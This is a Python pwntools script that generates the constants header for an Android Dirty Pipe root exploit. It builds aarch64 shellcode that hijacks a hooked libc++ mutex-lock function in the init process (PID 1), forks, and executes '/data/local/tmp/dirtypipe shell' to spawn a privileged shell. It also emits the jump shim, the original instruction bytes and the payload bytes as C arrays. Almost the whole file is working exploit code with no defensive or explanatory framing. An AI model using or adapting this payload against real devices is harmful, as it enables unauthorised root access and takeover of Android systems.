from pwn import *
import sys

context.arch = 'aarch64'

libcpp = ELF('android_libc++.so')
# streambuff_ctor = libcpp.symbols[b'_ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev']
streambuff_ctor = libcpp.symbols[b'_ZNSt3__15mutex4lockEv']

UNUSED_CODE_START = 0xa3bd0
UNUSED_CODE_END = 0xa4000

TEXT_SEGMENT_OFFSET = 0xd0

def bytes_to_c_array(data: bytes) -> str:
    return '{' + ', '.join(str(n) for n in data) + '}'

def load_reg_64(reg: str, value: int) -> str:
    return f'''
movz {reg}, {value & 0xffff}, lsl #0
movk {reg}, {(value & 0xffff0000) >> 16}, lsl #16
movk {reg}, {(value & 0xffff00000000) >> 32}, lsl #32
movk {reg}, {(value & 0xffff000000000000) >> 48}, lsl #48
'''

def push_str_on_stack(data_str: str) -> str:
    data = data_str.encode() + b'\0'
    pad_len = 16 - (len(data) % 16)
    data = data.ljust(len(data) + pad_len, b'\0')

    out = ''
    for i in range(0, len(data), 16):
        n1 = u64(data[i:i+8])
        n2 = u64(data[i+8:i+16])

        out = f'''
sub sp, sp, #16
{load_reg_64('x0', n1)}
str x0, [sp, #0]
{load_reg_64('x0', n2)}
str x0, [sp, #8]
''' + out
    
    return out

def main():
    if len(sys.argv) != 1 and len(sys.argv) != 3:
        print('Usage: gen_constants.py <exploit_data_dir> <dirtypipe_binary>')
        sys.exit(1)
    elif len(sys.argv) == 3:
        exploit_data_dir = sys.argv[1]
        binary_path = sys.argv[2]
    else:
        exploit_data_dir = '/data/local/tmp'
        binary_path = '/data/local/tmp/dirtypipe'

    jmp_shim = asm(f'b {UNUSED_CODE_START - streambuff_ctor}', vma = streambuff_ctor)
    assert len(jmp_shim) == 4
    old_instr_bytes = libcpp.read(streambuff_ctor, 4)

    payload = f'''
    // Allocate space: 8 registers x 8 bytes = 64 bytes
    sub sp, sp, #80

    // Store registers to stack
    stp x0, x1, [sp, #0]
    stp x2, x3, [sp, #16]
    stp x4, x5, [sp, #32]
    stp x6, x7, [sp, #48]
    str x20, [sp, #64]
    mov x20, sp

    // getpid syscall
    mov x8, #172          // syscall number for getpid
    svc #0
    cmp x0, #1            // is PID == 1?
    b.ne exit             // if not, exit

    // Set up arguments for clone()
    // x86_64
    // long clone(unsigned long flags, void *child_stack,
    //            int *parent_tid, int *child_tid, unsigned long tls)
    //
    // aarch64
    // long clone(unsigned long flags, void *child_stack,
    //            int *parent_tid, unsigned long tls, int *child_tid)
    //

    mov x0, #0            // flags = SIGCHLD (to make clone act like fork)
    mov x1, #0            // child_stack = NULL (kernel allocates it)
    mov x2, #0            // ptid = NULL
    mov x3, #0            // ctid = NULL
    mov x4, #0            // newtls = 0
    mov x8, #220          // syscall number for clone
    svc #0                // make syscall
    cmp x0, #0
    b.lt exit             // error
    b.gt exit             // parent process exits

    // execve("/data/local/tmp/dirtypipe", ["dirtypipe", "shell"], NULL)
    {push_str_on_stack(binary_path)}
    mov x6, sp

    {push_str_on_stack('shell')}
    mov x5, sp

    sub sp, sp, #32
    str x6, [sp, #0]
    str x5, [sp, #8]
    str xzr, [sp, #16]

    // argv
    mov x1, sp

    // filename
    mov x0, x6

    mov x2, xzr           // envp = NULL

    mov x8, #221          // syscall number for execve
    svc #0

exit:
    mov sp, x20

    ldp x0, x1, [sp, #0]
    ldp x2, x3, [sp, #16]
    ldp x4, x5, [sp, #32]
    ldp x6, x7, [sp, #48]
    ldr x20, [sp, #64]

    // Free stack space
    add sp, sp, #80
    '''

    print(payload)

    payload = asm(payload, vma = UNUSED_CODE_START) + old_instr_bytes

    return_jmp_location = UNUSED_CODE_START + len(payload)
    return_jmp = asm(f'b {streambuff_ctor + 4 - return_jmp_location}', vma = return_jmp_location)
    payload = payload + return_jmp

    assert len(payload) < UNUSED_CODE_END - UNUSED_CODE_START

    new_text_size = 0x5b000

    header_file = f'''
#ifndef DIRTYPIPE_H
#define DIRTYPIPE_H

#include <stddef.h>

size_t HOOK_ADDR = {hex(streambuff_ctor)};
unsigned char JMP_SHIM[] = {bytes_to_c_array(jmp_shim)};
unsigned char ORIGINAL_HOOK_CODE[] = {bytes_to_c_array(old_instr_bytes)};

size_t PAYLOAD_ADDR = {hex(UNUSED_CODE_START)};
unsigned char PAYLOAD[] = {bytes_to_c_array(payload)};

// just for testing
size_t TEXT_SEGMENT_OFFSET = {hex(TEXT_SEGMENT_OFFSET)};
unsigned char TEXT_SEGMENT_PAYLOAD[] = {bytes_to_c_array(p64(new_text_size) + p64(new_text_size))};

#define EXPLOIT_DATA_DIR "{exploit_data_dir}"

#endif
'''

    with open('dirtypipe.h', 'w') as f:
        f.write(header_file)

if __name__ == '__main__':
    main()
